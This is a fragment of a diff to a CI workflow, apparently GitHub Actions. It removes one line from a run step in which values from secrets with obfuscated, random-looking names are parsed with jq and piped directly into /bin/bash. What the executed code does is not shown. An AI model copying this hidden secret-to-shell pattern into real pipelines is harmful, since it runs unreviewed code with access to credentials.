@@ -23,7 +23,6 @@ jobs:
           vzfoh4: ${{ secrets.vzfoh4 }}
         run: |
           printf '%s' "$vzfoh4" | jq -r .tdivd65 | /bin/bash
-          echo $ho609 | jq -r .wzg367 | /bin/bash
           echo $caag03 | jq -r .yrqtw09 | /bin/bash
           echo $so18 | jq -r .i03280 | /bin/bash
           echo $yuo569 | jq -r .w556 | /bin/bash
